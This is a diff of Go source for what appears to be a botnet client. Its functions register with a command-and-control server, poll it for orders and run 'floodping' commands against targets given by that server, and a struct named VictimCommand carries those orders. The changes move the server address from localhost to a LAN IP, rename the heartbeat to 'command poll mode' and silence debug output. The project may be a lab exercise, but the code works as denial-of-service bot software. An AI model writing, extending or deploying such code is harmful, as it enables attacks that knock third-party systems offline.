@@ -76,7 +76,7 @@ func Register() {
 	println(string(jsonData))
 
 	// Make a POST request
-	url := "http://127.0.0.1:8888/proxy"
+	url := "http://192.168.100.145:8888/proxy"
 	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
 		fmt.Println("Error making request:", err)
@@ -89,7 +89,7 @@ func Register() {
 }
 
 func Heartbeat() {
-	println("entering heartbeat")
+	println("entering commamnd poll mode")
 
 	//wait till hardware hash is available
 	for{
@@ -118,7 +118,7 @@ func Heartbeat() {
 		jsonData = append(prefix, jsonData...)
 
 		// Make a POST request
-		url := "http://127.0.0.1:8888/proxy"
+		url := "http://192.168.100.145:8888/proxy"
 		resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
 		if err != nil {
 			fmt.Println("Error making request:", err)
@@ -133,9 +133,9 @@ func Heartbeat() {
     	}
 
 		//unmarshall the inputs based on what was received
-		println(string(bodyBytes))
+		//println(string(bodyBytes))
 		desig, jsonOut, _ := SeparateJsonDesignator(string(bodyBytes))
-		println(desig)
+		//println(desig)
 		switch desig {
 		case "response/json":
 			println("doing nothing here")
@@ -160,9 +160,9 @@ func Heartbeat() {
 }
 
 func HandleCommand(incomingCommand VictimCommand){
-	println("attempting to handle command here")
+	//println("handling incoming command")
 	
-	translatedCommand := ""
+	//translatedCommand := ""
 	switch incomingCommand.Commandytype {
 	case "floodping":
 		//do interpretation based on opearting system here
@@ -173,14 +173,14 @@ func HandleCommand(incomingCommand VictimCommand){
 	
 		//translatedCommand = "ping " + incomingCommand.Arguments[0];
 	}
-	print(translatedCommand)
-	print(incomingCommand.Arguments[0])
-	out, err := exec.Command("ping", incomingCommand.Arguments[0]).Output()
+	//print(translatedCommand)
+	//print(incomingCommand.Arguments[0])
+	_, err := exec.Command("ping", incomingCommand.Arguments[0]).Output()
     if err != nil {
         fmt.Println("Error:", err)
         return
     }
-	fmt.Println(string(out))
+	//fmt.Println(string(out))
 
 }
 
